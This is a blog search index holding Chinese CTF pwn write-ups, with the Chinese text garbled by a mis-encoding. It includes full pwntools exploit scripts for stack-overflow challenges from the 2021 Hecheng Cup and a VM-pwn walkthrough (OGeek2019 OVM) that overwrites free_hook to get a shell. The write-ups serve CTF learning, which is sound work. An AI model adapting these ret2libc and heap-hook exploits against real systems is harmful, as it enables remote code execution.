<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021é¹¤åŸæ¯PWN</title>
    <url>/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡é¹¤åŸæ¯çš„é¢˜ç›®å‹å–„ï¼Œé€‚åˆæˆ‘è¿™ç§pwnğŸ‘¶ç©è€ï¼Œä½†æ˜¯å°±æ˜¯è¿™ç§å¹¼å„¿å›­éš¾åº¦ï¼Œå´æ²¡èƒ½akï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼Œç»§ç»­å­¦ä¹ å§ï¼è¿Ÿæ—©ğŸ‘¶è¦å˜æˆğŸ‘´ï¼</p>
<h2 id="babyof"><a href="#babyof" class="headerlink" title="babyof"></a>babyof</h2><p>æ™®é€šæ ˆæº¢å‡ºï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œéå¸¸åŸºç¡€çš„é¢˜</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">21613</span>)<br><span class="hljs-comment">#p = process(&#x27;./littleof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./babyof&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>main = <span class="hljs-number">0x40066b</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000400743</span><br>ret = <span class="hljs-number">0x0000000000400506</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,payload)<br>p.recvline()<br>puts = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)<br>p.send(payload)<br>p.recvline()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="littleof"><a href="#littleof" class="headerlink" title="littleof"></a>littleof</h2><p>è¿™é¢˜æ¯”ä¸Šé¢å¤šäº†ä¸ªcanaryçš„æ³„éœ²ï¼Œå…¶ä»–æ²¡ä»€ä¹ˆå·®åˆ«ï¼ŒåŒæ ·æ˜¯åŸºç¡€æ ˆæº¢å‡ºé¢˜ç›®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">27056</span>)<br><span class="hljs-comment">#p = process(&#x27;./littleof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./littleof&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>main = <span class="hljs-number">0x00000000004006E2</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000400863</span><br>ret = <span class="hljs-number">0x000000000040059e</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> <br>p.sendlineafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>)<br>canary = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0xa</span><br>log.info(<span class="hljs-built_in">hex</span>(canary))<br>p.recvuntil(<span class="hljs-string">&quot;Try harder!&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.send(payload)<br>p.recvline()<br>puts = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Try harder!&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="easycho"><a href="#easycho" class="headerlink" title="easycho"></a>easycho</h2><p>è¿™é¢˜æ˜¯stack smashï¼Œç¨‹åºæŠŠflagè¯»åˆ°äº†.bssä¸Šï¼Œåˆæœ‰åœ°æ–¹å¯ä»¥å†™æ³„éœ²pieåœ°å€ï¼Œè·å¾—pieåœ°å€ï¼Œä¹Ÿå°±è·å¾—äº†flagåœ°å€ï¼Œä¹‹åé€šè¿‡æ ˆæº¢å‡ºæŠŠargv[0]æ”¹ä¸ºæŒ‡å‘flagï¼Œåœ¨å¼•å‘stack_chk_failåæ‰“å°å‡ºflag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">24842</span>)<br><span class="hljs-comment">#p = process(&#x27;./easyecho&#x27;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0xB1D)&quot;)</span><br>p.recvuntil(<span class="hljs-string">&quot;Name: &quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>pie = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xcf0</span><br>flag_addr = <span class="hljs-number">0x0000000000202040</span> + pie<br>log.info(<span class="hljs-built_in">hex</span>(pie))<br>p.recvuntil(<span class="hljs-string">&quot;Input: &quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;backdoor&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Input: &quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x168</span> + p64(flag_addr))<br>p.sendlineafter(<span class="hljs-string">&quot;Input: &quot;</span>,<span class="hljs-string">&#x27;exitexit&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>æ”»é˜²ä¸–ç•Œæœ‰åŸé¢˜<a href="https://blog.csdn.net/seaaseesa/article/details/103093182/%EF%BC%8C%E6%AF%9B%E9%83%BD%E6%B2%A1%E5%8F%98">https://blog.csdn.net/seaaseesa/article/details/103093182/ï¼Œæ¯›éƒ½æ²¡å˜</a></p>
<h2 id="onecho"><a href="#onecho" class="headerlink" title="onecho"></a>onecho</h2><p>è¿™é¢˜æ¯”èµ›æ²¡å‡ºï¼Œå¥½å¥½å†™å†™wp</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>VM pwn</title>
    <url>/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¬¬ä¸€æ¬¡åšVM pwnï¼Œè™½ç„¶å…¨ç¨‹æ˜¯è·Ÿç€è¯¸å¤šå¤§ä½¬åšå®¢èµ°çš„ï¼Œä½†æ€»å¾—è¿˜æ˜¯ä¸ªé‡Œç¨‹ç¢‘ï¼Œåœ¨pwnçš„è·¯ä¸Šèµ°çš„æ›´è¿œäº†ä¸€äº›ã€‚pwnğŸ‘¶ä¹Ÿæƒ³å˜æˆpwnğŸ‘´ï¼Œä¸çŸ¥é“è¿™å¤©è¿˜æœ‰å¤šè¿œ~</p>
<p>wpæ¥æºï¼š</p>
<p><a href="https://blog.csdn.net/A951860555/article/details/117214601?spm=1001.2014.3001.5501">https://blog.csdn.net/A951860555/article/details/117214601?spm=1001.2014.3001.5501</a></p>
<p><a href="https://www.cnblogs.com/lemon629/p/13975686.html">https://www.cnblogs.com/lemon629/p/13975686.html</a></p>
<p><a href="https://blog.csdn.net/seaaseesa/article/details/105862737">https://blog.csdn.net/seaaseesa/article/details/105862737</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/257132453">https://zhuanlan.zhihu.com/p/257132453</a></p>
<h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p>é¢˜ç›®æ¥è‡ªbuuoj</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211004113441697.png" alt="image-20211004113441697"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œstackæ²¡å¼€</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191907462.png" alt="image-20211005191907462"></p>
<p>ä¸»å‡½æ•°çš„ä»£ç å®¡è®¡</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191927756.png" alt="image-20211005191927756"></p>
<p>fetchå‡½æ•°çš„è¯ï¼Œå–å‡ºpcæŒ‡å‘çš„æŒ‡ä»¤ï¼Œå¹¶è‡ªåŠ¨åŠ 1ï¼ŒæŒ‡å‘ä¸‹ä¸€æ¡</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005192113608.png" alt="image-20211005192113608"></p>
<p>executeå‡½æ•°çš„ä»£ç å®¡è®¡ï¼Œä¸‹é¢æ˜¯æ ¹æ®ä»£ç æ•´åˆå‡ºæ¥çš„æŒ‡ä»¤è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">instr  --&gt;  op | num1 | num2 | num3  4B 32bit<br>op:<br>0x10 --&gt; reg[num1] = unsigned_byte(instr)<br>0x20 --&gt; reg[num1] = (byte(instr) == 0)<br>0x30 --&gt; reg[num1] = memory[reg[num3]] --&gt; mov mem, reg<br>0x40 --&gt; memory[reg[num3]] = reg[num1] --&gt; mov reg, mem<br>0x50 --&gt; stack[sp++] = reg[num1] --&gt; push reg<br>0x60 --&gt; reg[num1] = stack[--sp] --&gt; pop reg<br>0x70 --&gt; reg[num1] = reg[num3] + reg[num2] --&gt; add<br>0x80 --&gt; reg[num1] = reg[num2] - reg[num3] --&gt; sub<br>0x90 --&gt; reg[num1] = reg[num3] &amp; reg[num2] --&gt; and<br>0xA0 --&gt; reg[num1] = reg[num3] | reg[num2] --&gt; or<br>0xB0 --&gt; reg[num1] = reg[num3] ^ reg[num2] --&gt; xor  <br>0xC0 --&gt; reg[num1] = reg[num2] &lt;&lt; reg[num3]--&gt; shl<br>0xD0 --&gt; reg[num1] = reg[num2] &gt;&gt; reg[num3]--&gt; shr<br>0XE0 and else --&gt; exit<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005183901799-16334329637311.png" alt="image-20211005183901799"></p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191434825.png" alt="image-20211005191434825"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">çŸ¥è¯†è¡¥å……ï¼š<br>movsx æœ‰ç¬¦å·æ‰©å±•ï¼Œå¹¶ä¼ é€ã€‚é€šè¿‡ç¬¦å·è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœç¬¦å·ä½æ˜¯0ï¼Œåˆ™æ‰©å±•çš„å…¨éƒ½æ˜¯0ï¼Œå¦‚æœæ˜¯1ï¼Œåˆ™æ‰©å±•çš„å…¨éƒ½æ˜¯1ã€‚è€Œè¯¥é¢˜ä¸­çš„movsxdæ˜¯ä¸€æ ·çš„ï¼Œå¯èƒ½æ˜¯å› ä¸ºæ˜¯ä»ecxæ‹“å±•ä¸ºrdx<br>movzx æ— ç¬¦å·æ‰©å±•ï¼Œå¹¶ä¼ é€ã€‚æ‰€ä»¥ä¸€èˆ¬é€‚ç”¨åœ¨æ— ç¬¦å·çš„å°æ•°å€¼æ‹·è´åˆ°å¤§æ•°å€¼é‡Œé¢<br>ä¸¤ä¸ªæŒ‡ä»¤æ‰©å±•çš„ä½æ•°éƒ½å’Œç›®çš„æ“ä½œå¯„å­˜å™¨çš„ä½æ•°ä¸€è‡´<br></code></pre></td></tr></table></figure>

<p>ç»“åˆæ±‡ç¼–ä¸€èµ·çœ‹ï¼Œå¯ä»¥å‘ç°ï¼Œæ•°ç»„ä¸‹æ ‡æ²¡æœ‰ç¦æ­¢ä¸ºè´Ÿæ•°çš„æƒ…å†µï¼Œæ‰€ä»¥æ˜¯å¯ä»¥å‘ä¸Šè®¿é—®åˆ°gotè¡¨ï¼Œä»è€ŒæŠŠå‡½æ•°åœ°å€æ”¾å…¥å¯„å­˜å™¨ä¸­ï¼Œè·å¾—å‡½æ•°åœ°å€ã€‚ä½†æ˜¯è¿™è¾¹è¦æ³¨æ„ï¼Œå¯„å­˜å™¨è·Ÿå†…å­˜æ˜¯4å­—èŠ‚çš„ï¼Œè€Œæ³„éœ²çš„åœ°å€æ˜¯6å­—èŠ‚çš„ï¼Œã€æ‰€ä»¥è¦ç”¨ä¸¤ä¸ªå¯„å­˜å™¨åˆ†åˆ«å­˜æ”¾é«˜å››å­—èŠ‚å’Œä½å››å­—èŠ‚</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005195005486.png" alt="image-20211005195005486"></p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005195011712.png" alt="image-20211005195011712"></p>
<p>ç„¶åå°±æ˜¯é€€å‡ºexecuteæ—¶ï¼Œä¼šå¾€ä¹‹å‰ç”³è¯·çš„å †å—é‡Œé¢å†™å…¥å†…å®¹ï¼Œå†é‡Šæ”¾æ‰ã€‚ä½†æ˜¯å› ä¸ºè¿™ä¸ªå †å—çš„åœ°å€æ˜¯å­˜æ”¾åœ¨.bssä¸Šçš„ï¼Œåœ¨ä¸Šé¢çš„æ•°ç»„è¶Šç•ŒåŒæ ·å¯ä»¥ä¿®æ”¹ï¼Œæ‰€ä»¥å¯ä»¥æ”¹ä¸ºfree_hook - 0x8ï¼Œæ”¹ä¸ºè¿™ä¸ªæ˜¯å› ä¸ºæˆ‘ä»¬è¦é‡Šæ”¾å¾—æ˜¯ä¸€å—å«æœ‰/bin/shçš„å †å—ï¼Œæ‰€ä»¥è¦å…ˆæœ‰ä½ç½®å¡«å……/bin/shï¼Œç„¶åå†å†™å…¥systemå‡½æ•°ã€‚</p>
<p>å£°æ˜ï¼šæˆ‘ä¸‹é¢çš„å›¾éƒ½æ˜¯å¿˜äº†-0x8çš„ï¼Œåé¢æ‡’å¾—å†æˆªå›¾äº†</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005210317826.png" alt="image-20211005210317826"></p>
<p>å¯ä»¥çœ‹è§ï¼Œä¸€é¡¿æ“ä½œåï¼Œå¯„å­˜å™¨ä¸Šç¡®å®å­˜æ”¾äº†ä¸€ä¸ªlibcåœ°å€ï¼Œè®¡ç®—ä¸free_hookçš„åç§»å³å¯</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005211732444.png" alt="image-20211005211732444"></p>
<p>ç„¶åé€šè¿‡0x10ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„åŠ ï¼Œæœ€ç»ˆæ”¹æˆfree_hook</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005212732683.png" alt="image-20211005212732683"></p>
<p>è·Ÿç¬¬ä¸€æ­¥ä¸€æ ·ï¼ŒæŠŠfree_hookåœ°å€å†™å…¥comment</p>
<p>ç„¶åå°±æ˜¯è¾“å…¥/bin/shä»¥åŠsystemå‡½æ•°ï¼Œå³å¯getshellï¼</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005213743697.png" alt="image-20211005213743697"></p>
<p>æˆåŠŸï¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28420</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b *main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_code</span>(<span class="hljs-params">op,num1,num2,num3</span>):</span><br>    code = (op&lt;&lt;<span class="hljs-number">24</span>) + (num1&lt;&lt;<span class="hljs-number">16</span>) + (num2&lt;&lt;<span class="hljs-number">8</span>) + num3<br>    p.sendline(<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">instr  --&gt;  op | num1 | num2 | num3  4B 32bit</span><br><span class="hljs-string">op:</span><br><span class="hljs-string">0x10 --&gt; reg[num1] = unsigned_byte(instr)</span><br><span class="hljs-string">0x20 --&gt; reg[num1] = (byte(instr) == 0)</span><br><span class="hljs-string">0x30 --&gt; reg[num1] = memory[reg[num3]] --&gt; mov reg, mem</span><br><span class="hljs-string">0x40 --&gt; memory[reg[num3]] = reg[num1] --&gt; mov mem, reg</span><br><span class="hljs-string">0x50 --&gt; stack[sp++] = reg[num1] --&gt; push reg</span><br><span class="hljs-string">0x60 --&gt; reg[num1] = stack[--sp] --&gt; pop reg</span><br><span class="hljs-string">0x70 --&gt; reg[num1] = reg[num3] + reg[num2] --&gt; add</span><br><span class="hljs-string">0x80 --&gt; reg[num1] = reg[num2] - reg[num3] --&gt; sub</span><br><span class="hljs-string">0x90 --&gt; reg[num1] = reg[num3] &amp; reg[num2] --&gt; and</span><br><span class="hljs-string">0xA0 --&gt; reg[num1] = reg[num3] | reg[num2] --&gt; or</span><br><span class="hljs-string">0xB0 --&gt; reg[num1] = reg[num3] ^ reg[num2] --&gt; xor  </span><br><span class="hljs-string">0xC0 --&gt; reg[num1] = reg[num2] &lt;&lt; reg[num3]--&gt; shl</span><br><span class="hljs-string">0xD0 --&gt; reg[num1] = reg[num2] &gt;&gt; reg[num3]--&gt; shr</span><br><span class="hljs-string">0xE0 and else --&gt; exit</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;PCPC: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;SP: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;CODE SIZE: &quot;</span>,<span class="hljs-string">&#x27;18&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;CODE: &quot;</span>)<br><span class="hljs-comment">#å†™å…¥libc</span><br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">26</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">25</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x30</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>input_code(<span class="hljs-number">0x30</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#ä¿®æ”¹libc</span><br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>input_code(<span class="hljs-number">0xC0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xa0</span>)<br>input_code(<span class="hljs-number">0x70</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br>input_code(<span class="hljs-number">0x70</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#ä¿®æ”¹comment</span><br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x40</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>)<br>input_code(<span class="hljs-number">0x40</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>) <br>input_code(<span class="hljs-number">0xE0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) <span class="hljs-comment">#6</span><br>p.recvuntil(<span class="hljs-string">&quot;R1: &quot;</span>)<br>addr1 = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">&quot;R2: &quot;</span>)<br>addr2 = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">4</span>),<span class="hljs-number">16</span>)<br>addr = (addr2&lt;&lt;<span class="hljs-number">32</span>) + addr1 - <span class="hljs-number">0x3c67a0</span><br>log.info(<span class="hljs-string">&quot;libc_base: 0x%x&quot;</span> %addr)<br>p.recvuntil(<span class="hljs-string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ‰€è°“VM pwnï¼Œå°±æ˜¯æ¨¡æ‹Ÿè™šæ‹Ÿæœºçš„åº•å±‚è¿è¡Œæœºåˆ¶ï¼Œå¤§é€»è¾‘ä¸Šæ‹¥æœ‰å†…å­˜ã€å¯„å­˜å™¨ï¼Œå†…å­˜ç»†åˆ†è¿˜æœ‰å †æ ˆç­‰ç­‰ï¼Œä»¥åŠè‡ªå·±çš„ä¸€å¥—æŒ‡ä»¤é›†ï¼Œæ‰€ä»¥å¦‚æœå°±ç®—ç¢°åˆ°ä¸æ˜¯ä¸Šé¢çš„ç»™äº†ç¬¦å·è¡¨çš„ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªå¤§é€»è¾‘è‡ªå·±è¿›è¡Œç†è§£æ€§çš„è¿˜åŸä»£ç ï¼Œä½¿å¾—ä»£ç æ›´å¥½é˜…è¯»ã€‚è¿™ç±»å‹çš„pwné¢˜éš¾ç‚¹æ›´å¤šå°±æ˜¯åœ¨äºä»£ç é€»è¾‘çš„ç†è§£ï¼ŒçŸ¥é“æŒ‡ä»¤é›†çš„æ“ä½œï¼Œå†æ‰¾å¯»é‡Œé¢å‡ºç°çš„æ¼æ´ï¼Œè¦å…·å¤‡åè¶³çš„è€å¿ƒï¼Œæ¯•ç«Ÿç°åœ¨2021çš„é¢˜ç›®è‚¯å®šæ¯”ä¸Šé¢å¤æ‚å¾ˆå¤šå¾ˆå¤šã€‚</p>
<p>ç„¶åå‘¢åœ¨åˆ†æè™šæ‹Ÿæœºå®ç°äº†å“ªäº›æŒ‡ä»¤æ—¶ï¼Œå¯ä»¥ä»ä¸‹é¢ä¸¤ä¸ªå¤§æ–¹å‘å…¥æ‰‹ï¼šé¦–å…ˆæ‰¾åˆ°è™šæ‹Ÿå®ç°çš„å†…å­˜ä»¥åŠå¯„å­˜å™¨ï¼Œæ¯”å¦‚ç¨‹åºå¯èƒ½å•ç‹¬mallocå‡ å—å†…å­˜ç”¨æ¥å½“ä½œå¯„å­˜å™¨æˆ–è€…æ ˆç©ºé—´ï¼Œäº¦æˆ–è€…å°±ç”¨å…¨å±€å˜é‡æ¥å®ç°ï¼›ç¬¬äºŒæ­¥å°±æ˜¯è¯»ä»£ç é€»è¾‘ï¼Œåˆ†ææŒ‡ä»¤ã€‚æœ‰å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥æ ¹æ®æç¤ºçš„å­—ç¬¦ä¸²è¯†åˆ«ï¼›æ²¡æœ‰å­—ç¬¦ä¸²ï¼Œåˆ™æ ¹æ®æŒ‡ä»¤<code>æ“ä½œç </code>å’Œ<code>æ“ä½œæ•°</code>æ„æˆï¼Œæ“ä½œæ•°çš„ä¸ªæ•°è¿˜å¯åˆ†ä¸ºä¸€æ“ä½œæ•°æŒ‡ä»¤ã€ä¸¤æ“ä½œæ•°æŒ‡ä»¤ä»¥åŠä¸‰æ“ä½œæ•°æŒ‡ä»¤ç­‰æ¦‚å¿µåŠ å…¥åˆ°ä»£ç é€»è¾‘çš„é˜…è¯»ä¸­ï¼Œå¸®åŠ©æˆ‘ä»¬å¿«é€Ÿåˆ†æå’Œç†è§£ã€‚</p>
